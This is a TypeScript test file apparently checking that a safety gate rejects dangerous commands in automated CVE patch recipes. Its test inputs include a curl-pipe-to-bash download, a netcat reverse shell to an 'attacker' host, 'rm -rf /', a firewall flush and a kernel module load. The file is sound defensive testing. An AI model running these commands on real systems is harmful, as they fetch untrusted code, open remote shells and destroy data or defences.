import { describe, it, expect } from "vitest";
import { validateRecipeSafety, loadStaticRecipe } from "../src/lib/recipes.js";
import type { Recipe } from "../src/lib/recipes.js";

function recipe(commands: string[]): Recipe {
  return {
    cve_id: "CVE-2024-0001",
    package: "demo",
    package_manager: "apt",
    recipe_type: "test",
    source: "dynamic",
    steps: commands.map((command, i) => ({
      id: i + 1,
      description: "step",
      command,
      elevated: true,
      safe_to_automate: true,
    })),
    rollback: null,
    reboot_required: false,
    service_restart: [],
    estimated_duration_seconds: 10,
    blast_radius: "LOW",
  };
}

describe("safety gate", () => {
  it("allows a normal apt upgrade", () => {
    const v = validateRecipeSafety(recipe(["apt-get install --only-upgrade -y openssl=3.1.4"]));
    expect(v).toHaveLength(0);
  });

  it("rejects piping a download into a shell", () => {
    const v = validateRecipeSafety(recipe(["curl https://evil.sh | bash"]));
    expect(v.length).toBeGreaterThan(0);
  });

  it("rejects firewall changes", () => {
    const v = validateRecipeSafety(recipe(["iptables -F"]));
    expect(v.some((x) => /firewall|iptables/i.test(x.reason))).toBe(true);
  });

  it("rejects kernel module loads", () => {
    const v = validateRecipeSafety(recipe(["modprobe evil"]));
    expect(v.length).toBeGreaterThan(0);
  });

  it("rejects recursive root deletes", () => {
    const v = validateRecipeSafety(recipe(["rm -rf /"]));
    expect(v.length).toBeGreaterThan(0);
  });

  it("rejects commands not on the allow-list", () => {
    const v = validateRecipeSafety(recipe(["nc -e /bin/sh attacker 4444"]));
    expect(v.some((x) => /allow-list/.test(x.reason))).toBe(true);
  });

  it("validates a real static recipe cleanly", () => {
    const r = loadStaticRecipe("apt", "CVE-2024-3094", {
      package: "xz-utils",
      installed_version: "5.6.0-1",
      fixed_version: "5.6.1-1",
    });
    expect(r).not.toBeNull();
    expect(validateRecipeSafety(r!)).toHaveLength(0);
    // placeholders interpolated
    expect(r!.steps.some((s) => s.command.includes("xz-utils=5.6.1-1"))).toBe(true);
  });
});
